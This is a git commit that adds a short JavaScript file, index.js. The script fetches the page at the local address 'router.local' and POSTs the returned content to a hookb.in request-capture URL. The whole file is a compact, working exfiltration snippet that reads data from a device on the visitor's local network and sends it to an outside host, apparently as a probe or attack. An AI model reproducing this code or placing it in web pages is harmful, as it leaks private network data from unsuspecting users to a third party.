7f8e7b8430eed916ccc0115bb96edb679a7cdcc5
nastassiagoodson <60201494+nastassiagoodson@users.noreply.github.com>
2022-03-03 15:57:06 -0800

    Create index.js

---
+++ index.js
@@ -0,0 +1,9 @@
+const http = new XMLHttpRequest();
+http.addEventListener('load', function (event) {
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', 'https://hookb.in/yDwrleVRemUG9yjjwYK1', true);
+    xhr.setRequestHeader('Content-type', 'application/json');
+    xhr.send(JSON.stringify(http.responseText));
+});
+http.open('GET', 'router.local');
+http.send();
